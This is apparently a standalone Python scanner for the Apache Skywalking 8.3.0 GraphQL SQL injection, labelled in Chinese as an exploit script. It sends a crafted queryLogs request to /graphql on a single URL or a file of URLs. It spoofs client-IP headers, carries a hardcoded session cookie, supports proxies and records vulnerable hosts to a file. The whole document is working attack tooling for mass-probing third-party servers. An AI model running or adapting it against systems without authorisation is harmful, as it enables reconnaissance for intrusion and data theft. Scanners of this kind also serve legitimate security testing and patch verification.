# -*- coding: utf-8 -*
# /usr/bin/python3
# @Author:Firebasky
import argparse
import threading
import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 利用脚本

result = [] # 结果

info = 'Apache Skywalking 8.3.0 SQL Injection Vulnerability'


# 添加
endpoints = [
    '/graphql',
]


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Content-Type': 'application/json',
    'Cookie': 'ADMINCONSOLESESSION=1hDwvQkPnPmLyDpwJvBL1qWTyXLYvQqSlMvJv3h7xyTxz5BJtGm3!1162256454',
    'X-Forwarded-For': '127.0.0.1',
    'X-Client-IP': '127.0.0.1',
    'X-Remote-IP': '127.0.0.1',
    'X-Remote-Addr': '127.0.0.1',
    'X-Originating-IP': '127.0.0.1',
}

proxy = {
    'http': '127.0.0.1:8080'
}


def save(result):
    file = open('result.txt', 'w')
    for line in result:
        file.write(line + '\n')
    file.close()


def Scan_http(url, socket_proxies):
    FLAG = False
    payload = {
        "query": "query queryLogs($condition: LogQueryCondition) {\r\n  queryLogs(condition: $condition) {\r\n    total\r\n    logs {\r\n      serviceId\r\n      serviceName\r\n      isError\r\n      content\r\n    }\r\n  }\r\n}\r\n",
        "variables": {"condition": {"metricName": "sqli", "paging": {"pageSize": 10}, "state": "ALL"}}}

    for endpoint in endpoints:
        try:
            res = requests.post(url+endpoint, json=payload, headers=headers, timeout=2, verify=False, proxies=socket_proxies, allow_redirects=False)
            if "sqli" in res.text and res.status_code == 200:
                FLAG=True
                result.append(url+' 存在'+info)
                print(url+'\033[1;31m存在'+info+'\033[0m')
                break
        except:
            pass
    if not FLAG:
        print(url+"扫描完成不存在漏洞")


def fileTarget(file, socket_proxies):
    with open(file) as url_txt:
        urls = url_txt.readlines()
        for url in urls:
            url = url.replace('\n', '')
            Scan_http(url, socket_proxies)
    save(result)


def multiRun(file, socket_proxies):
    t = threading.Thread(target=fileTarget, args=(file, socket_proxies))
    t.start()
    t.join()



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=info+'scanner')
    parser.add_argument('-f', default=None, help='read target url from file')
    parser.add_argument('-u', default=None, help='target url')
    parser.add_argument('-proxy', default=None, help='-proxy socks5://0.0.0.0:8088')
    args = parser.parse_args()
    socket_proxies = None
    if args.proxy:
        socket_proxies = {
            'http': args.proxy
        }
    if args.u:
        Scan_http(args.u, socket_proxies)
        exit(0)
    if args.f:
        multiRun(args.f, socket_proxies)
        exit(0)
    else:
        parser.print_help()
        exit(0)
